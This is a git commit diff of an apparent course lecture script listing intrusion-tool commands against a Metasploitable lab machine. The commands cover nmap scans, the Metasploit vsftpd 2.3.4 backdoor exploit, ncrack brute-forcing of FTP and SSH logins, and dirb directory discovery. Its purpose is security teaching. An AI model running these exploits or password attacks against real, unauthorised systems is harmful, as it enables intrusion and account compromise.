dac11f02a4a7a679894c6e0fe0b92e5040853c24
Lance Hundt <lance.hundt@ung.edu>
2023-02-21 20:44:40 -0500

    Reupload Wk6/Wk7 as LF style

--- Lecture/Week6/IntrustionTools.sh
+++ Lecture/Week6/IntrustionTools.sh
@@ -2,43 +2,44 @@
 
 ### Nmap ###
 #Scan a Subnet for common services (255 addresses)
-nmap 10.0.2.0/24
+nmap 192.168.253.135/24
 
 #Scan an specific port or port ranges
-nmap -p 1-100 10.0.2.4
+nmap -p 1-100 192.168.253.135
 
 #Perform Fast Scan
-nmap -F 10.0.2.4
+nmap -F 192.168.253.135
 
 #Scan with Standard Service Detection
-nmap -sV 10.0.2.4
+nmap -sV 192.168.253.135
 
-#Scan with Operating System detection only
-nmap -O 10.0.2.4
+#Scan with Operating System detection only (Requires root access --> sudo)
+nmap -O 192.168.253.135
 
 #Scan all ports (Aggressive Scan)
-nmap -A 10.0.2.4
+nmap -A 192.168.253.135
 
 
 ### Metasploit ###
 msfconsole #Launches Metasploit Console
 use exploit/unix/ftp/vsftpd_234_backdoor # Pick an exploit
-set RHOST 10.0.2.4 # Set the target
+set RHOST 192.168.253.135 # Set the target
 exploit  # Fire away
 
 #nCrack Example
 #Try different username and passwords
-ncrack 10.0.2.4:21
+ncrack 192.168.253.135:21
 
 #Specify a specific user
-ncrack 10.0.2.4:21 --user Luke
+ncrack 192.168.253.135:21 --user Luke
+
 #Tail the end of the log file "Live" on Metasploitable machine ;)
 tail -f /var/log/vsftpd.log
 
 #Another Example for SSH 
-ncrack 10.0.2.4:22 --user msfadmin -P 10k-pass.txt -p ssh -v
+ncrack 192.168.253.135:22 --user msfadmin -P 10k-most-common-passwords.txt -p ssh -v
 tail -f /var/log/auth.log
 
 
 #dirb tool to discover all webpages
-dirb http://10.0.2.4
+dirb http://192.168.253.135
